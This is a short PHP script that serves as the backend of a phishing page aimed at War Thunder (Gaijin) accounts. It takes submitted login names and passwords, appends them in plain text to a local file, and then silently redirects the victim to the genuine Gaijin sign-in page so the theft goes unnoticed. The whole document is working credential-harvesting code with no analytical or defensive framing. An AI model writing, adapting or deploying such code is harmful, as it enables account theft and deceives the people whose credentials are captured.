<?PHP
$Log = $_POST['login'];
$Pass = $_POST['pass'];
$log = fopen("database.txt","at");
fwrite($log,"$Log:$Pass\n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://login.gaijin.net/ru/sso/login?return_url=aHR0cDovL3dhcnRodW5kZXIucnUvcnUvZXh0TG9naW4vP2Zyb209&crc=73697a3b4579773b19b6b5e7ef8aca12&public_key=UOWlwLc8M1wOUKRPSEy9&domain=warthunder.ru&refresh_token=1'></head></html>";
?>